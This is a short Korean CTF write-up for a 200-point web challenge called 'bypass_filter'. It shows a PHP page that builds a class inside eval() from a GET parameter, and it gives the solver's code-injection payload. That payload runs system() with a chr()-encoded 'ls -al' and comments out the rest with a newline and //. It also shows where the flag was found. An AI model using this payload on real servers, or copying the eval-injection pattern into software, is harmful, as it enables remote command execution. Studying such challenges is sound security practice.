## No.27 Web bypass_filter[200]

**점수:** 200

**분야:** Web

**제목:** bypass_filter

다음과 같은 코드를 사용하는 사이트가 문제로 주어졌다.

eval을 보니 문제의 의도가 code injection일거라고 생각했다.

그래서 $\_GET['content']에 `files_imgfiles1{function i(){system(chr(108).chr(115).chr(32).chr(45).chr(97).chr(108));}}\n//` 형태로 보내주면 됐다.

eval에 한 줄로 적혀있으니 엔터 + // 를 하면 바로 주석 처리 가능했다.

ls를 적으며 살펴보았더니 답은 다음과 같은 위치에 존재했다.

http://223.194.105.182:23080/flag.yourawesome/flag.txt

```php
<?php

class Iamclassbecauseiamclass
{
    function i()
    {
                if($_GET['content']){
                    $content = $_GET['content'];
                    return $content;
                } else {
                    echo "<meta http-equiv='refresh' content='0;URL=\"./index.php?content=files_imgfiles1\"' /> ";
                }
    }
}

$class =  implode( '/', explode( '_', Iamclassbecauseiamclass::i() ) );

if( substr( $class, 0, 14 ) === 'files/imgfiles' and is_numeric( substr( $class, 14, 1 ) ) )
{
    $contentid = substr($class, 14);
    eval( "class Iamclass{$contentid} extends Iamclassbecauseiamclass { function i() { \$no = $contentid; if(\$no==1){ \$path='./files/images1';}return \$path; } }" );
}

$v = Iamclass1::i();
?>
<img src="<?php echo($v);echo("/0fed9c050dba713078325dfb028ceeb5.jpg")?>">
```
